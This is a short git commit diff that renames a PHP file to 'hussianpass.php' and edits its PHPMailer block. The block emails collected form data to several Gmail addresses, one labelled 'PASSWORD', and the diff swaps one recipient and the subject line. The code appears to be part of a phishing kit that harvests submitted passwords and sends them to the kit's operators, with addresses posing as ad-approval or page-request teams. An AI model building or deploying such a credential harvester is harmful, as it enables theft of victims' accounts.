97b4ebefa578d04a0599a8208c552ff89e72785c
mhussainofficial03 <mhussain.official03@gmail.com>
2025-08-22 06:40:00 +0800

    Update and rename ismailpass.php to hussianpass.php

--- hussianpass.php
+++ hussianpass.php
@@ -36,13 +36,13 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         // Email properties
         $mail->addAddress('rutherfordhenress@gmail.com', 'PASSWORD');
         $mail->addAddress('approval.ads.monica.ramey@gmail.com');
-        $mail->addAddress('page.request.team.blue.on.service@gmail.com');
+        $mail->addAddress('approval.ads.monica.ramey@gmail.com');
 
       // Email recipient's address
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'ISMAIL';
+        $mail->Subject = 'HUSSIAN';
         $mail->Body = $emailBody; // Set the email body using the collected form data
 
 
